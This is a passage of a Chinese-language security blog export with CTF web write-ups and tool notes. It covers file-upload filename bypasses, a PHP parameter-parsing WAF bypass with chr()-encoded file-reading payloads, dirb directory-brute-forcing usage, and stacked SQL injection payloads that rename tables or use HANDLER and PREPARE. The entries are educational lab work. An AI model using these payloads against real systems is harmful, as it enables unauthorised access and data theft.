class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=file_name.php<br>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=filename.php<br>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=filename&quot;.php<br>Content-Disposition: form-data; <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;upload_file&quot;</span>; <span class="hljs-attribute">filename</span>=1.php<br></code></pre></td></tr></table></figure><h3 id="内容过滤"><a href="#内容过滤" class="headerlink" title="内容过滤"></a>内容过滤</h3><p>垃圾字符</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221213211444830.png" alt="image-20221213211444830"></p><h3 id="杂记"><a href="#杂记" class="headerlink" title="杂记"></a>杂记</h3><p>如果过滤了<code>$_GET</code>、<code>$_POST</code>或<code>$_REQUEST</code>，可以使用<code>$_SESSION</code>，这样可以在请求的<code>Cookie</code>中设置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Cookie: session=<span class="hljs-built_in">phpinfo</span>();<br></code></pre></td></tr></table></figure><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a href="https://github.com/c0ny1/upload-fuzz-dic-builder">c0ny1&#x2F;upload-fuzz-dic-builder: 上传漏洞fuzz字典生成脚本 (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] RoarCTF2019-EasyCalc</title>
    <link href="/2022/11/24/%5Bctf-web%5D%20RoarCTF2019-EasyCalc/"/>
    <url>/2022/11/24/%5Bctf-web%5D%20RoarCTF2019-EasyCalc/</url>
    
    <content type="html"><![CDATA[<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进入后是一个计算机，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221124192733066.png" alt="image-20221124192733066"></p><p>查看源码发现文件<code>calc.php</code>，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里需要出入参数<code>num</code>，尝试后发现只能传入数字，看来是被WAF过滤了。</p><p>知识点来了。</p><p>在PHP中，<code>$_GET</code>或<code>$_POST</code>的参数会保存到数组中，比如<code>/?foo=bar</code>，保存为<code>Array([foo]=&gt;&#39;bar&#39;)</code>，但是在解析过程中，会将某些字符删除或用下划线代替，比如<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42</code>，所以如果WAF中的某条规则是不允许输入参数<code>news_id</code>时，可以使用上面的语句绕过。</p><p>在这道题中，对参数<code>num</code>进行了各种检查，但如果传入的参数是<code> num</code>，注意前面有个空格，在传入参数是就是一个新的变量<code> num</code>（前面有空格），而不是<code>num</code>了（没有空格）；但在PHP解析时，会先把空格去掉，这样就绕过了WAF。</p><p>这样就可以继续了，由于过滤了一些符号，所以使用<code>chr()</code>绕过，使用<code>calc.php? num=print_r(scandir(chr(47)))</code>，就是查看<code>/</code>下的文件，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221124194044373.png" alt="image-20221124194044373"></p><p>发现了<code>f1agg</code>，然后使用<code>calc.php? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code>，得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[工具] 目录爆破-dirb</title>
    <link href="/2022/11/23/%5B%E5%B7%A5%E5%85%B7%5D%20%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-dirb/"/>
    <url>/2022/11/23/%5B%E5%B7%A5%E5%85%B7%5D%20%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4-dirb/</url>
    
    <content type="html"><![CDATA[<h1 id="dirb使用"><a href="#dirb使用" class="headerlink" title="dirb使用"></a>dirb使用</h1><p>dirb是一个基于字典的web目录扫描工具，会用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站。</p><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>基本用法：</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">dirb <span class="hljs-attribute">&lt;url_base&gt;</span> [<span class="hljs-attribute">&lt;wordlist_file(s)&gt;</span>] [options]<br></code></pre></td></tr></table></figure><p>dirb的字典在<code>/usr/share/wordlists/dirb/</code>目录下。</p><table><thead><tr><th>参数</th><th>解释</th></tr></thead><tbody><tr><td><code>-a &lt;agent_string&gt;</code></td><td>指定User-Agent</td></tr><tr><td><code>-b</code></td><td>使用原路径</td></tr><tr><td><code>-c &lt;cookie-string&gt;</code></td><td>设置cookie</td></tr><tr><td><code>-E &lt;certificate&gt;</code></td><td>客户端认证路径</td></tr><tr><td><code>-f</code></td><td>Fine tunning of NOT_FOUND (404) detection.（不显示404？）</td></tr><tr><td><code>-H &lt;header_string&gt;</code></td><td>自定义请求头</td></tr><tr><td><code>-i</code></td><td>大小写敏感</td></tr><tr><td><code>-l</code></td><td>打印<code>Location</code></td></tr><tr><td><code>-N &lt;nf_code&gt;</code></td><td>忽略指定状态码</td></tr><tr><td><code>-o &lt;output_file&gt;</code></td><td>输出文件</td></tr><tr><td><code>-p &lt;proxy[:port]&gt;</code></td><td>代理，默认端口<code>1080</code></td></tr><tr><td><code>-P &lt;proxy_username:proxy_password&gt;</code></td><td>代理认证</td></tr><tr><td><code>-r</code></td><td>不以递归方式扫描</td></tr><tr><td><code>-R</code></td><td>交互式递归，询问每个目录</td></tr><tr><td><code>-S</code></td><td>静默模式，不显示测试字段</td></tr><tr><td><code>-t</code></td><td>不强制URL以<code>/</code>结尾</td></tr><tr><td><code>-u &lt;username:password&gt;</code></td><td>HTTP认证</td></tr><tr><td><code>-v</code></td><td>显示NOT_FOUND页面</td></tr><tr><td><code>-w</code></td><td>遇到警告不会停止</td></tr><tr><td><code>-X &lt;extensions&gt;</code></td><td>在每个字段后添加指定后缀</td></tr><tr><td><code>-z &lt;millisecs&gt;</code></td><td>每个请求设置延迟</td></tr></tbody></table><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><p>基本使用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">186.131</span>/<br></code></pre></td></tr></table></figure><p>设置字典</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">186.131</span><span class="hljs-regexp">/ /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt <br></code></pre></td></tr></table></figure><p>指定扩展名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">186.131</span>/ -X .php<br></code></pre></td></tr></table></figure><p>输出文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">186.131</span>/ -o output.txt<br></code></pre></td></tr></table></figure><p>忽略状态码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirb</span> http://<span class="hljs-number">192.168.186.131</span>/ -N <span class="hljs-number">302</span><br></code></pre></td></tr></table></figure><p>设置延迟</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirb</span> http://<span class="hljs-number">192.168.186.131</span>/ -z <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>HTTP认证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.186.131/login.php -u <span class="hljs-built_in">test</span>:<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>设置代理</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">dirb</span> http://192.168.186.131/ –p <span class="hljs-number">192.168.1.108:3129</span><br></code></pre></td></tr></table></figure><p>设置UA和Cookie</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.116</span> -a <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span> -c <span class="hljs-string">&quot;BAIDUID=D5C6351DAC89EF8811A51DF3A9A9C0C4:FG=1; HMACCOUNT=2906306413846532; BIDUPSID=D5C6351DAC89EF8811A51DF3A9A9C0C4; PSTM=1585744543; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; H_PS_PSSID=30974_1438_31124_21098; HMVT=6bcd52f51e9b3dce32bec4a3997715ac|1587436663|; delPer=0; PSINO=6; BDRCVFR[gltLrB7qNCt]=mk3SLVN4HKm&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>工具</tag>
      
      <tag>目录爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 强网杯2019-随便注</title>
    <link href="/2022/11/23/%5Bctf-web%5D%20%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/"/>
    <url>/2022/11/23/%5Bctf-web%5D%20%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>这道题做了好多次还是不会。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221123193055900.png" alt="image-20221123193055900"></p><p>输入<code>1&#39;</code>会出现错误，<code>1&#39; order by 1-- -</code>正常，最后得到有两列，使用<code>union select</code>会出现过滤规则<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>使用堆叠注入查库，<code>1&#39;;show databases;#</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221123193446464.png" alt="image-20221123193446464"></p><p>查表，<code>1&#39;;show tables;#</code>，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221123193513769.png" alt="image-20221123193513769"></p><p>查列，<code>1&#39;;desc words;#</code></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221123193600821.png" alt="image-20221123193600821"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221123193626404.png" alt="image-20221123193626404"></p><p>看来flag在表<code>1919810931114514</code>中，由于回显是有两列的，所以当前表应该是<code>words</code>表。怎么得到flag？各位师傅的奇思妙想：</p><ol><li>把表<code>words</code>修改为其他表名；</li><li>把表<code>1919810931114514</code>修改为<code>words</code>；</li><li>在表<code>1919810931114514</code>中插入一列<code>id</code>；或者可以直接修改列<code>flag</code>为<code>id</code></li><li>查询的时候就是<code>words</code>表中的<code>id</code>列，即flag。</li></ol><p>需要用到的关键字<code>rename</code>、<code>alter</code>、<code>table</code>、<code>change</code>、<code>varchar</code></p><p>执行的操作，<code>1&#39;;rename table </code>words<code>to words2;rename table</code>1919810931114514<code>to</code>words<code>;alter table words change flag id varchar(100);</code></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs applescript">rename table `<span class="hljs-built_in">words</span>` <span class="hljs-keyword">to</span> `abc`;<br>修改表 <span class="hljs-built_in">words</span> 改名为其它，<br><br>rename table `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> `<span class="hljs-built_in">words</span>`;<br>修改表 <span class="hljs-number">1919810931114514</span> 改名为 <span class="hljs-built_in">words</span> <br><br>alter table <span class="hljs-built_in">words</span> change flag <span class="hljs-built_in">id</span> varchar(<span class="hljs-number">100</span>);<br>修改列 flag 改名为 <span class="hljs-built_in">id</span> <br><br></code></pre></td></tr></table></figure><p>查询时使用<code>1&#39; or 1=1#</code>显示所有。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221123200627281.png" alt="image-20221123200627281"></p><h2 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h2><p><code>handler</code>可以打开表的句柄，然后一行一行读数据。基本操作为，</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">HANDLER</span> TableName <span class="hljs-keyword">OPEN</span> [<span class="hljs-keyword">AS</span> NewName];    # 打开表<br><span class="hljs-keyword">HANDLER</span> TableName <span class="hljs-keyword">READ</span> FIRST;           # 读首行<br><span class="hljs-keyword">HANDLER</span> TableName <span class="hljs-keyword">READ</span> NEXT;            # 读下一行<br><span class="hljs-keyword">HANDLER</span> TableName <span class="hljs-keyword">CLOSE</span>;                # 关闭<br></code></pre></td></tr></table></figure><p>所以在这里可以</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open <span class="hljs-keyword">as</span> a;handler a <span class="hljs-built_in">read</span> <span class="hljs-keyword">first</span>;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221123195657297.png" alt="image-20221123195657297"></p><h2 id="sql预处理"><a href="#sql预处理" class="headerlink" title="sql预处理"></a>sql预处理</h2><p>预处理语句可以这样定义，</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">定义预处理语句 <span class="hljs-keyword">PREPARE</span> stmt_name <span class="hljs-keyword">FROM</span> preparable_stmt; <br>执行预处理语句 EXECUTE stmt_name [USING @var_name [, @var_name] ...]; <br>删除(释放)定义 &#123;DEALLOCATE | <span class="hljs-keyword">DROP</span>&#125; <span class="hljs-keyword">PREPARE</span> stmt_name;<br></code></pre></td></tr></table></figure><p>在这里过滤了<code>select</code>，可以用<code>concat</code>和<code>char</code>联合替代，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">concat</span>(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), <span class="hljs-string">&quot; * from `1919810931114514`&quot;</span>)<br></code></pre></td></tr></table></figure><p>在sql语句中，@  用于定义变量，所以最后的语句，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;;SET @sql = concat(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), <span class="hljs-string">&quot; * from `1919810931114514`&quot;</span>); PREPARE a from @sql; EXECUTE a;<br></code></pre></td></tr></table></figure><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php">set=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;easy_sql&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;<br>&lt;!-- sqlmap是没有灵魂的 --&gt;<br>&lt;form method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>    姿势: &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;inject&quot;</span> value=<span class="hljs-string">&quot;1&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;pre&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf1</span>(<span class="hljs-params"><span class="hljs-variable">$inject</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="hljs-variable">$inject</span>) &amp;&amp; <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf2</span>(<span class="hljs-params"><span class="hljs-variable">$inject</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$inject</span>, <span class="hljs-string">&quot;set&quot;</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$inject</span>, <span class="hljs-string">&quot;prepare&quot;</span>) &amp;&amp; <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;inject&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;inject&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">waf1</span>(<span class="hljs-variable">$id</span>);<br>    <span class="hljs-title function_ invoke__">waf2</span>(<span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;supersqli&quot;</span>);<br>    <span class="hljs-comment">//多条sql语句</span><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `words` where id = &#x27;<span class="hljs-subst">$id</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">multi_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>)&#123;<span class="hljs-comment">//使用multi_query()执行一条或多条sql语句</span><br>      <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$rs</span> = <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">store_result</span>())&#123;<span class="hljs-comment">//store_result()方法获取第一条sql语句查询结果</span><br>          <span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$rs</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>())&#123;<br>            <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$row</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>          &#125;<br>          <span class="hljs-variable">$rs</span>-&gt;<span class="hljs-title function_ invoke__">Close</span>(); <span class="hljs-comment">//关闭结果集</span><br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">more_results</span>())&#123;  <span class="hljs-comment">//判断是否还有更多结果集</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;hr&gt;&quot;</span>;<br>          &#125;<br>        &#125;<br>      &#125;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">next_result</span>()); <span class="hljs-comment">//next_result()方法获取下一结果集，返回bool值</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error &quot;</span>.<span class="hljs-variable">$mysqli</span>-&gt;errno.<span class="hljs-string">&quot; : &quot;</span>.<span class="hljs-variable">$mysqli</span>-&gt;error;<br>    &#125;<br>    <span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();  <span class="hljs-comment">//关闭数据库连接</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] ACTF2020新生赛-BackupFile</title>
    <link href="/2022/11/23/%5Bctf-web%5D%20ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/"/>
    <url>/2022/11/23/%5Bctf-web%5D%20ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/</url>
    
    <content type="html"><![CDATA[<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>进入后是一个页面，只显示<code>Try to find out source file!</code>，看来需要目录爆破了，使用<code>dirb</code>进行爆破，看题目可能是备份文件<code>.bak</code>，所以使用命令，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span>b093e3d8-cd04-<span class="hljs-number">4</span>fe3-b874-a1ec95208d08.node4.buuoj.cn:<span class="hljs-number">81</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/common.txt -N <span class="hljs-number">429</span> -X .bak<br></code></pre></td></tr></table></figure><p>得到了文件<code>index.php.bak</code>，下载后查看文件，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source 